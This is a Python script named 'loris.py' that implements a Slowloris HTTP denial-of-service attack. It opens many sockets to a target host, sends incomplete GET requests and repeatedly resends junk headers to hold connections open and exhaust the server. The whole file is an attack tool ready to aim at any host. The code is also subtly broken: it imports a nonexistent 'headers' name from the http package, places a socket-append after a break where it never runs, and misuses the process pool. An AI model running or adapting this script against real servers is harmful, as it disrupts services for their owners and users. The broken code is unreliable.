import argparse
import logging
import random
import socket
import sys
import time
from concurrent.futures.process import ProcessPoolExecutor
from multiprocessing import cpu_count

from http import headers

parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********",
                                 prog="loris.py",
                                 usage="loris.py [host] [-p PORT] [-s SOCKETS] [-v VERBOSE]")
parser.add_argument('host', nargs="?", help="host being attacked")
parser.add_argument('-p', '--port', default=80, help="port number (Web Server [HTTP] port is 80)", type=int)
parser.add_argument('-s', '--sockets', default=50, help="number of sockets", type=int)
parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
args = parser.parse_args()

if args.host is None:
    sys.exit("\nA host is not given.")

if args.verbose:
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d.%m.%Y %H:%M:%S", level=logging.DEBUG)

sockets = []
ip = args.host
port = args.port
print("\n\nInitializing attack on {}:{}".format(ip, port))


def connect(host_ip):
    """
    Creates a connection to the given IP address.
    :param host_ip: Ip Address of the host.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    try:
        sock.connect((host_ip, port))
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

        for header in headers:
            sock.send("{}\r\n".format(header).encode("utf-8"))

        return sock
    except socket.gaierror as e:
        print("\nAn error occured while connecting to host: ", e)
        sys.exit(1)
    except socket.error as e:
        print(e)
        sys.exit(1)


def main():
    socket_count = args.sockets
    print("Starting an attack to {}:{} with {} sockets.".format(ip, port, socket_count))
    print("Creating {} sockets...".format(socket_count))

    for i in range(socket_count):
        try:
            s = connect(ip)
            logging.debug("Socket {} created and connected to {}:{}".format(s.getsockname(), ip, port))
        except socket.error:
            break
            sockets.append(s)

    print("{} sockets are connected to {}.".format(socket_count, ip))
    while True:
        print("\nResending headers in order to keep the connection alive...")

        for s in sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 2000)).encode("utf-8"))
            except socket.error:
                logging.debug("Socket {} is timed out.".format(s.getsockname()))
                sockets.remove(s)

        logging.debug("Socket count: %s", len(sockets))
        dead_sockets = socket_count - len(sockets)
        print("{} sockets are timed out...".format(dead_sockets))
        print("Recreating {} new sockets...".format(dead_sockets))

        for _ in range(dead_sockets):
            try:
                s = connect(ip)
                logging.debug("Socket {} recreated and connected to {}".format(s.getsockname(), ip))
                if s:
                    sockets.append(s)
            except socket.error:
                break

        time.sleep(10)


if __name__ == "__main__":
    # main() is mapped to the cores of the machine
    with ProcessPoolExecutor(max_workers=cpu_count()) as executor:
        out_list = list(executor.map(main()))
